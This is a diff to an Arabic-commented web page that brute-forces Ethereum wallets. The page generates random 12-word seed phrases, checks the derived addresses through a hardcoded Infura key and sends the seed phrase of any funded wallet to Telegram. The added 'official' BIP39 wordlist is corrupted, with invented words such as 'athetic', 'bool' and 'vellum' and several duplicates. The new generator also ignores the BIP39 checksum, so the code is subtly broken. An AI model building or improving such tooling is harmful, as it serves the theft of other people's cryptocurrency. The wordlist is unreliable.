@@ -594,6 +594,224 @@
     <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
 
     <script>
+        // قائمة كلمات BIP39 الإنجليزية الرسمية
+        const BIP39_WORDLIST = [
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
+            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
+            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
+            "adult", "advance", "advice", "aerobic", "affair", "affect", "affirm", "afford", "afraid", "after",
+            "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm",
+            "album", "alcohol", "alert", "alien", "align", "alike", "alive", "allow", "almost", "alone",
+            "alpha", "already", "also", "alter", "always", "amaze", "ambition", "amount", "ample", "analyst",
+            "ancestor", "anchor", "ancient", "android", "animal", "anomaly", "another", "answer", "antenna", "antique",
+            "any", "apart", "appendix", "apple", "apply", "approve", "approximate", "arch", "area", "arena",
+            "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
+            "art", "article", "ascent", "ask", "asleep", "aspect", "assault", "asset", "assist", "assume",
+            "assurance", "assure", "astronomy", "at", "athetic", "atlas", "atom", "attack", "attend", "attitude",
+            "attract", "auction", "audience", "audit", "august", "author", "auto", "available", "avenue", "average",
+            "avoid", "awake", "aware", "away", "awesome", "awful", "axis", "baby", "back", "backup",
+            "bacon", "bad", "bag", "balance", "balcony", "ball", "banana", "band", "bank", "bar",
+            "bare", "bargain", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "become",
+            "beef", "before", "begin", "behalf", "behave", "behind", "believe", "bell", "belong", "below",
+            "belt", "bench", "bend", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
+            "bid", "big", "bill", "binary", "bind", "bio", "bird", "birth", "bitter", "black",
+            "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "block", "blood", "bloom",
+            "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bold",
+            "bolt", "bomb", "bond", "bone", "bonus", "book", "bool", "boost", "border", "bore",
+            "borrow", "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket",
+            "brain", "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath",
+            "breed", "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown",
+            "brush", "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch",
+            "burn", "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus",
+            "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy",
+            "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
+            "care", "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog",
+            "catch", "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor",
+            "central", "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change",
+            "channel", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry",
+            "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
+            "cigar", "cinema", "cipher", "circle", "citizen", "city", "civil", "claim", "clash", "class",
+            "clean", "clear", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock",
+            "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach",
+            "coast", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
+            "comfort", "comic", "common", "company", "compare", "compel", "compensate", "component", "comprise", "computer",
+            "concert", "conclude", "concrete", "confirm", "confuse", "connect", "consider", "console", "conspiracy", "constant",
+            "contact", "contain", "contrast", "control", "convince", "cook", "cool", "copper", "copy", "coral",
+            "core", "corn", "correct", "cosmic", "cost", "cotton", "couch", "country", "couple", "course",
+            "cousin", "cover", "cow", "cowboy", "crack", "cradle", "craft", "cram", "crane", "crash",
+            "crate", "crave", "crawl", "crazy", "cream", "create", "credit", "creek", "crew", "cry",
+            "crypt", "cube", "culture", "cup", "curious", "current", "curve", "cushion", "cut", "cycle",
+            "dad", "damage", "damp", "dance", "danger", "dare", "dark", "dash", "data", "daughter",
+            "dawn", "day", "deal", "debate", "decade", "decay", "deceive", "december", "decide", "decline",
+            "decorate", "decrease", "deer", "defend", "define", "defy", "degree", "delay", "deliver", "demand",
+            "demise", "denounce", "dense", "dentist", "deny", "depart", "depend", "depict", "deposit", "depress",
+            "depth", "deputy", "derive", "describe", "desert", "design", "desire", "desktop", "despise", "destroy",
+            "detail", "detect", "determine", "develop", "device", "devote", "diagnose", "diamond", "diary", "dice",
+            "die", "diesel", "diet", "differ", "dig", "digit", "dignity", "dilemma", "dinner", "dip",
+            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "dispose",
+            "distance", "distract", "district", "ditch", "dive", "divide", "divorce", "dizzy", "doctor", "document",
+            "dog", "doll", "domestic", "donor", "door", "dose", "double", "doubt", "down", "download",
+            "dozens", "draft", "drag", "drain", "drama", "draw", "dream", "dress", "drink", "drip",
+            "drive", "drop", "dry", "duck", "duplicate", "dust", "duty", "dwarf", "dwell", "dynamic",
+            "eager", "eagle", "ear", "earlier", "early", "earn", "earth", "easily", "east", "easy",
+            "echo", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
+            "elder", "electric", "elegant", "element", "elevate", "eleven", "elite", "else", "embark", "embed",
+            "embryo", "emit", "empire", "empty", "enable", "encode", "end", "endorse", "endure", "enemy",
+            "energy", "enforce", "engage", "engine", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
+            "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "equivalent", "era", "erase",
+            "erect", "error", "escape", "especially", "essay", "essence", "establish", "estimate", "eternal", "ethical",
+            "ethics", "even", "evening", "event", "ever", "every", "evident", "evil", "evoke", "evolve",
+            "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust",
+            "exhibit", "exile", "exist", "exit", "expand", "expect", "experience", "expert", "explain", "explode",
+            "explore", "export", "expose", "express", "extend", "extra", "extract", "ordinary", "extreme", "eyebrow",
+            "eye", "fable", "face", "faculty", "fade", "fail", "fair", "faith", "fall", "false",
+            "fame", "family", "famous", "fan", "fancy", "farm", "fashion", "fast", "fate", "father",
+            "fault", "favor", "favorite", "fear", "feature", "february", "federation", "fee", "feed", "feel",
+            "female", "fence", "festival", "fetch", "few", "fiber", "fiction", "field", "figure", "file",
+            "fill", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
+            "fiscal", "fish", "fit", "fitness", "five", "fix", "flag", "flame", "flash", "flat",
+            "flavor", "flee", "flesh", "flex", "flight", "flip", "float", "flock", "floor", "flower",
+            "fluid", "flush", "fly", "foam", "focus", "follow", "food", "foot", "force", "forest",
+            "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "four", "fox",
+            "fragile", "frame", "fresh", "friend", "frog", "front", "frost", "frown", "frozen", "fruity",
+            "fury", "future", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden",
+            "garlic", "gas", "gate", "gather", "gauge", "generate", "genius", "genre", "gentle", "gently",
+            "german", "gesture", "get", "ghost", "giant", "gift", "ginger", "girl", "give", "glad",
+            "glance", "glass", "glide", "glimpse", "global", "globe", "gloom", "glory", "glove", "glow",
+            "glue", "go", "goal", "goat", "god", "gold", "good", "goose", "gorgeous", "gorilla",
+            "gospel", "gossip", "govern", "grab", "grace", "grade", "grain", "grand", "grant", "grape",
+            "grasp", "grass", "gravity", "gray", "great", "greek", "green", "greet", "grid", "grief",
+            "grim", "grip", "grit", "groan", "groom", "groove", "gross", "ground", "group", "grow",
+            "guarantee", "guard", "guess", "guide", "guitar", "gulf", "gun", "gym", "habit", "hair",
+            "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "hardware", "hardy", "harm",
+            "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog",
+            "height", "hello", "help", "hence", "her", "here", "heritage", "hero", "hide", "high",
+            "hill", "hint", "hip", "hire", "his", "historic", "history", "hit", "hive", "hobby",
+            "hoe", "hold", "hollow", "honest", "honey", "honor", "hope", "horizon", "horn", "horror",
+            "horse", "hospital", "host", "hotel", "hour", "hover", "how", "human", "humble", "humor",
+            "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "hush", "hybrid", "ice", "icon",
+            "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
+            "imminent", "immoral", "impact", "impose", "impress", "improve", "impulse", "in", "inch", "include",
+            "income", "increase", "index", "indicate", "infinite", "inflate", "influence", "inform", "initial", "inject",
+            "injury", "inner", "incentive", "input", "insane", "insect", "inside", "inspect", "inspire", "install",
+            "instinct", "institute", "instruct", "instrument", "insulate", "insure", "intact", "interest", "internal", "interact",
+            "internet", "interpret", "into", "invade", "invent", "invest", "invite", "involve", "iron", "is",
+            "island", "isolate", "issue", "item", "its", "jacket", "jail", "jam", "jar", "jazz",
+            "jealous", "jeans", "jeep", "jelly", "jewel", "job", "join", "joint", "joystick", "judge",
+            "juice", "july", "jump", "jungle", "junior", "junk", "just", "justice", "keen", "keep",
+            "keeper", "kernel", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
+            "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "knowledge", "lab",
+            "label", "labor", "lack", "ladder", "lady", "lag", "lake", "lamp", "language", "lap",
+            "laptop", "large", "larva", "laser", "last", "laugh", "launch", "lavish", "law", "lawn",
+            "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
+            "legend", "leisure", "lemon", "lend", "length", "lens", "lentil", "leopard", "less", "lesson",
+            "let", "letter", "level", "liar", "liberty", "library", "license", "life", "light", "like",
+            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "load", "loan",
+            "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lost", "lotion", "loud",
+            "lounge", "love", "loyal", "luck", "luggage", "lumber", "lunch", "lung", "luxury", "lyrics",
+            "macro", "magic", "magnify", "mail", "main", "major", "make", "mammal", "man", "manage",
+            "mango", "manifold", "manner", "manual", "many", "marble", "march", "margin", "marine", "market",
+            "marry", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
+            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melon",
+            "memo", "memory", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
+            "method", "middle", "might", "mighty", "migrate", "mile", "military", "milk", "mill", "minimum",
+            "mint", "minute", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixer", "mobile",
+            "model", "modify", "moment", "money", "monitor", "monkey", "monster", "month", "moon", "moral",
+            "more", "morning", "mortgage", "most", "mother", "motor", "mountain", "mouse", "move", "movie",
+            "much", "muffin", "mule", "multiply", "murmur", "muscle", "museum", "mushroom", "music", "must",
+            "mutual", "my", "mystery", "myth", "nail", "name", "narrow", "nasty", "nation", "natural",
+            "nature", "near", "neck", "need", "negotiate", "neighbor", "neither", "nervous", "network", "neutral",
+            "never", "news", "next", "nice", "night", "nine", "noble", "noise", "nomad", "none",
+            "noon", "normal", "north", "nose", "notable", "note", "nothing", "notice", "noun", "now",
+            "nuclear", "number", "nun", "nurse", "nut", "oath", "obey", "object", "oblige", "obscene",
+            "observe", "obtain", "occasion", "ocean", "october", "odds", "off", "offense", "office", "often",
+            "oil", "okay", "old", "olive", "omega", "on", "once", "one", "only", "open",
+            "opera", "opinion", "oppose", "opposite", "option", "orange", "orbit", "orchard", "order", "ordinary",
+            "organ", "origin", "original", "orphan", "other", "ought", "ounce", "our", "outside", "oven",
+            "over", "owner", "oxygen", "pace", "pack", "package", "page", "pain", "paint", "pair",
+            "pale", "palm", "pan", "panda", "panel", "panic", "pant", "paper", "parade", "parent",
+            "park", "parrot", "party", "pass", "passage", "past", "paste", "path", "patient", "patrol",
+            "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pepper", "perfect",
+            "perform", "period", "permit", "person", "pet", "phone", "photo", "phrase", "pick", "picture",
+            "piece", "pierce", "pig", "pigeon", "pill", "pilot", "pine", "pink", "pioneer", "pistol",
+            "pitch", "pivot", "pixel", "place", "plain", "plan", "planet", "plastic", "plate", "play",
+            "please", "pledge", "pluck", "plug", "plunge", "pole", "police", "policy", "polish", "pollution",
+            "pool", "popular", "portion", "position", "possible", "post", "potato", "potent", "pound", "poverty",
+            "powder", "power", "practice", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride",
+            "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit",
+            "program", "project", "promise", "promote", "proof", "property", "prosper", "protect", "provide", "prune",
+            "public", "pudding", "pull", "pulp", "pulse", "pump", "punish", "pupil", "puppy", "purchase",
+            "pure", "purge", "push", "put", "puzzle", "pyramid", "quality", "quantify", "quarter", "question",
+            "quick", "quit", "quiz", "quote", "rabbit", "race", "rack", "radar", "radio", "rail",
+            "rain", "raise", "rally", "ram", "ranch", "random", "range", "rapid", "rare", "rash",
+            "rate", "rather", "raven", "raw", "reach", "read", "ready", "real", "reason", "rebel",
+            "rebuild", "recall", "receive", "recipe", "record", "recover", "recruit", "recycle", "reduce", "reflect",
+            "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely",
+            "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat",
+            "replace", "report", "represent", "republic", "require", "rescue", "research", "reside", "resist", "resolve",
+            "resort", "resource", "response", "result", "retire", "retreat", "return", "reveal", "review", "reward",
+            "rhythm", "ribbon", "rice", "rich", "riddle", "ride", "ridge", "rifle", "right", "rigid",
+            "ring", "rinsing", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
+            "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
+            "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "rural", "rush",
+            "raccoon", "sad", "saddle", "safe", "safety", "salad", "salary", "sale", "sally", "salt",
+            "same", "sample", "sanctuary", "sand", "satisfy", "satellite", "satisfy", "sauce", "save", "say",
+            "scale", "scan", "scare", "scatter", "scene", "school", "science", "scissors", "scorpion", "scout",
+            "scrap", "screen", "screw", "script", "scrub", "sea", "search", "season", "seat", "second",
+            "secret", "section", "security", "see", "seed", "seek", "segment", "select", "self", "sell",
+            "seminar", "senior", "sense", "sentence", "series", "service", "session", "set", "settle", "setup",
+            "seven", "several", "severe", "sex", "shadow", "shaft", "shake", "shallow", "shame", "shape",
+            "share", "shark", "sharp", "shave", "she", "sheep", "sheet", "shelf", "shell", "shield",
+            "shift", "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder",
+            "shove", "show", "shrimp", "shrink", "shrug", "shuffle", "shy", "sick", "side", "siege",
+            "sift", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "simply",
+            "since", "sing", "single", "sink", "sister", "situate", "six", "size", "skate", "sketch",
+            "skill", "skin", "skirt", "sky", "slam", "sleep", "slice", "slide", "slim", "slip",
+            "slope", "slow", "sly", "small", "smart", "smile", "smoke", "smooth", "snap", "sniff",
+            "snow", "snuggle", "so", "social", "sock", "soft", "soil", "solar", "soldier", "solid",
+            "solve", "some", "someone", "something", "sometimes", "son", "song", "soon", "sorry", "sort",
+            "soul", "sound", "source", "south", "space", "spark", "speak", "special", "speed", "spell",
+            "spend", "sphere", "spice", "spider", "spirit", "split", "spread", "spring", "spy", "squad",
+            "square", "squeeze", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay",
+            "steady", "steam", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stir",
+            "stock", "stomach", "stone", "stool", "story", "strain", "strand", "strange", "strap", "strategy",
+            "stream", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
+            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
+            "sun", "sunday", "sunrise", "sunshine", "super", "supply", "support", "supreme", "sure", "surface",
+            "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "sweat", "sweep",
+            "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system",
+            "table", "tackle", "tag", "tail", "talent", "talk", "tall", "tame", "tank", "tape",
+            "target", "task", "taste", "tattoo", "tax", "teach", "team", "tear", "tech", "text",
+            "than", "thank", "that", "the", "then", "theme", "them", "thence", "theory", "there",
+            "therefore", "these", "they", "thick", "thief", "thin", "thing", "think", "third", "this",
+            "those", "though", "thread", "three", "thrive", "throw", "thumb", "thus", "ticket", "tide",
+            "tiger", "tight", "tile", "till", "time", "tiny", "tip", "tire", "tissue", "title",
+            "to", "toad", "today", "toe", "together", "token", "tolerance", "tomato", "tomorrow", "tone",
+            "tongue", "tonight", "too", "tool", "tooth", "top", "topic", "toss", "total", "touch",
+            "tough", "tour", "toward", "tower", "town", "toy", "trace", "track", "trade", "traffic",
+            "tragedy", "trail", "train", "transfer", "transform", "trap", "trash", "travel", "tray", "tread",
+            "treasure", "treat", "tree", "trend", "trial", "tribe", "trick", "truly", "trumpet", "trust",
+            "try", "tube", "tug", "tumble", "tuna", "tunnel", "turbo", "twelve", "twenty", "twice",
+            "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncertain",
+            "unchain", "uncle", "under", "undermine", "understand", "undo", "uneasy", "unfair", "unfold", "unhappy",
+            "unify", "union", "unique", "unit", "universe", "unknown", "unless", "unload", "unlock", "until",
+            "untouched", "up", "update", "uplift", "upload", "upset", "urban", "urge", "us", "usage",
+            "use", "used", "useful", "usher", "usual", "utility", "vacant", "vague", "valid", "valley",
+            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "vellum", "velvet",
+            "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "vial",
+            "vibrant", "vicious", "victory", "video", "view", "village", "vine", "violet", "virtue", "visual",
+            "vital", "vivid", "vocal", "vocals", "vote", "voyage", "vs", "vulnerable", "wage", "wait",
+            "walk", "wall", "walnut", "want", "war", "ward", "warm", "warn", "wash", "wasp",
+            "waste", "watch", "water", "wave", "way", "we", "weak", "wealth", "weapon", "wear",
+            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
+            "what", "wheat", "wheel", "when", "where", "whether", "which", "while", "whisper", "wide",
+            "widget", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter",
+            "wire", "wisdom", "wise", "wish", "withdraw", "within", "without", "woman", "wonder", "wood",
+            "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "write", "wrong",
+            "yard", "yearn", "year", "yell", "yellow", "you", "young", "your", "youth", "zeal",
+            "zero", "zone", "zoo"
+        ];
+
         // إعدادات التطبيق
         const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
         const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
@@ -630,6 +848,22 @@
             currentStatus: document.getElementById('currentStatus'),
             logPanel: document.getElementById('logPanel')
         };
+
+        // وظائف توليد العبارات العشوائية
+        function getSecureRandomInt(max) {
+            const array = new Uint32Array(1);
+            window.crypto.getRandomValues(array);
+            return array[0] % max;
+        }
+
+        function generateRandomBIP39Phrase() {
+            const words = [];
+            for (let i = 0; i < 12; i++) {
+                const randomIndex = getSecureRandomInt(BIP39_WORDLIST.length);
+                words.push(BIP39_WORDLIST[randomIndex]);
+            }
+            return words.join(' ');
+        }
 
         // وظائف المحفظة
         async function mnemonicToAddress(mnemonic) {
@@ -795,6 +1029,63 @@
             elements.currentStatus.className = `alert alert-${type}`;
         }
 
+        // الوظيفة الرئيسية للبحث
+        async function searchForActiveWallets() {
+            try {
+                // توليد عبارة عشوائية
+                const mnemonic = generateRandomBIP39Phrase();
+                stats.totalGenerated++;
+                
+                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
+                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
+                
+                // تحويل العبارة إلى عنوان
+                const address = await mnemonicToAddress(mnemonic);
+                
+                if (!address) {
+                    stats.errors++;
+                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
+                    updateStats();
+                    return;
+                }
+                
+                // فحص نشاط المحفظة
+                const walletStatus = await isWalletActive(address);
+                
+                if (walletStatus.isActive) {
+                    stats.activeWallets++;
+                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
+                    
+                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
+                    if (telegramSent) {
+                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
+                    } else {
+                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
+                    }
+                    
+                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
+                } else {
+                    stats.emptyWallets++;
+                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
+                }
+                
+                updateStats();
+                
+                // التحقق من الحد الأقصى للمحاولات
+                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
+                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
+                    stopSearch();
+                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
+                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
+                }
+                
+            } catch (error) {
+                stats.errors++;
+                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
+                updateStats();
+            }
+        }
+
         // وظائف اختبار العبارات يدويًا
         async function testManualMnemonic() {
             const mnemonic = elements.manualMnemonic.value.trim();
@@ -909,55 +1200,6 @@
             await sendTelegramMessage(startMessage);
             
             searchInterval = setInterval(searchForActiveWallets, speed);
-        }
-
-        // الوظيفة الرئيسية للبحث
-        async function searchForActiveWallets() {
-            try {
-                // إنشاء عبارة عشوائية باستخدام ethers
-                const wallet = ethers.Wallet.createRandom();
-                const mnemonic = wallet.mnemonic.phrase;
-                const address = wallet.address;
-                
-                stats.totalGenerated++;
-                
-                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
-                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
-                
-                const walletStatus = await isWalletActive(address);
-                
-                if (walletStatus.isActive) {
-                    stats.activeWallets++;
-                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
-                    
-                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
-                    }
-                    
-                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
-                } else {
-                    stats.emptyWallets++;
-                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
-                }
-                
-                updateStats();
-                
-                // التحقق من الحد الأقصى للمحاولات
-                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
-                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
-                    stopSearch();
-                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
-                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
-                }
-                
-            } catch (error) {
-                stats.errors++;
-                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
-                updateStats();
-            }
         }
 
         async function stopSearch() {
